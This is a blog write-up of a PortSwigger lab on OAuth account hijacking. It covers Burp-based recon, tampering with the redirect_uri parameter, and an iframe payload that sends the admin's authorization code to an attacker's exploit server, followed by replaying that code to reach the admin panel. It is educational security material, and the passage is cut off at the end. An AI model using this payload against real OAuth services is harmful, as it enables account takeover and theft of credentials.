---
title: OAuth Account Hijacking via redirect_uri
url: https://infosecwriteups.com/oauth-account-hijacking-via-redirect-uri-ae8ca7a66930?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-12-14
fetch_date: 2025-10-06T19:38:03.875942
---

# OAuth Account Hijacking via redirect_uri

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fae8ca7a66930&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Foauth-account-hijacking-via-redirect-uri-ae8ca7a66930&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Foauth-account-hijacking-via-redirect-uri-ae8ca7a66930&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-ae8ca7a66930---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-ae8ca7a66930---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# OAuth Account Hijacking via redirect\_uri

[![Ryan G. Cox](https://miro.medium.com/v2/resize:fill:64:64/1*VkvYzjvK_fuZ2Js8dEFC_g.jpeg)](https://medium.com/%40ryangcox?source=post_page---byline--ae8ca7a66930---------------------------------------)

[Ryan G. Cox](https://medium.com/%40ryangcox?source=post_page---byline--ae8ca7a66930---------------------------------------)

5 min read

·

Dec 10, 2024

--

Listen

Share

Press enter or click to view image in full size

![]()

[The Cybersec Café](https://www.cyberseccafe.com/)

Today, we’ll be walking through my step-by-step methodology as I approach an Oauth vulnerability. This is part of my [Methodology Walkthrough series](https://www.cyberseccafe.com/t/methodology-walkthrough) at the Cybersec Cafe. These writeups are from controlled environment to explain my methodology in order to help you learn how to test applications yourself.

## Objective

Steal the admin authorization code and use it to delete a user.

## What We Know

The lab uses an OAuth service to allow users to log in with their social media account. We have default ceredentials available to use to log in with.

## What is an OAuth Vulnerability?

An OAuth vulnerability arises when the OAuth authentication and authorization framework is misconfigured, allowing attackers to gain unauthorized access to user accounts or sensitive data. These vulnerabilities can result from flaws in token handling, redirect URIs, or improper scope restrictions, potentially compromising the security of both users and applications.

If you enjoy this article and want to be the first to see more like it, consider **subscribing** to my newsletter, the [Cybersec Cafe](https://www.cyberseccafe.com/), for *free*. I post content there first, and here second. Plus, you’ll get it straight to your inbox.

My goal is to deliver you value in various cybersecurity topics each week and to become your ultimate destination for expanding your expertise or for any aspiring cybersecurity professionals to break into the field.

## Methodology

Want to give the lab a try yourself and follow along? You can check it out on PortSwigger’s website [here](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri) for free.

## The Recon

We have a blog application in front of us, one that is very common in PortSwigger labs.

Press enter or click to view image in full size

![]()

However, since this is an app focused on the OAuth feature, we’ll prioritize poking at the login feature for now and revisit the blog feature if we get stuck.

Make sure that you’re logging your traffic through the Burp Proxy in order to capture the requests.

Generally, I recommend scoping your traffic to just log the current application. But, in this case, I’d recommend not since this application is using an external service to implement OAuth.

We can see the login page redirects us to login with social media, very different than what we’ve seen in other PortSwigger Labs in this series.

Press enter or click to view image in full size

![]()

After agreeing to authorize, we can see we are returned back to the blog page.

Let’s log out and try the login process again…

This time, we can see that we’re instantly logged in.

Navigating over to Burp and taking a look at the SiteMap, we can see the traffic we’ve collected from both the OAuth client and the lab environment:

Press enter or click to view image in full size

![]()

Now, let’s take a look at the Proxy History so we can view the traffic more contextually to get a better look at how the application is workin.

We can see that we have this */auth* endpoint, followed by an oauth-callback endpoint.

But, what I find most interesting is the redirect\_uri along with an authorization code in the query string:

Press enter or click to view image in full size

![]()

This is the perfect suspect of a request to send to the Repeater for some testing.

## Testing

When we send this over to the Repeater, we can start playing around with the *redirect\_uri* parameter.

The first thing I try is to change it to a random URL, take Google for example:

Press enter or click to view image in full size

![]()

We can see that the request returns a 302 and redirects to the site.

It still works — this is great news for us.

Now is a good time to realize that we have an exploit server available to us.

This immediately has me thinking we can leverage this redirect mechanism by redirecting to our exploit server to steal our admin user’s code.

Let’s give it a shot.

## Exploitation

Let’s open up the exploit server and craft our payload.

`<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`

This payload will take advantage of the flawed *redirect\_uri* to steal the code of the admin user once we deliver the payload to them.

We’ll be targeting the OAuth client and redirecting to our exploit server to log the access code.

You can see below how I’ve crafted this in my exploit server instance:

Press enter or click to view image in full size

![]()

When ready, click Store then Deliver exploit to victim.

Navigate to the Access Log, where you’ll see the victim code.

Log out, and navigate to the following URL, where you’ll be met with the Admin Panel:

`[https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=CODE](https://your-lab-id.web-security-academy.net/oauth-callback?code=CODE)`

Lab solved!!

## What We’ve Learned

We’ve learned that while many consider OAuth the “secure” implementation of authentication, it’s still essential to consider what you’re implementing into your applications. You may be able to find some logic errors in the implementation when encountering OAuth in applications in the wild, so it is never necessarily worth immediately writing off an application just...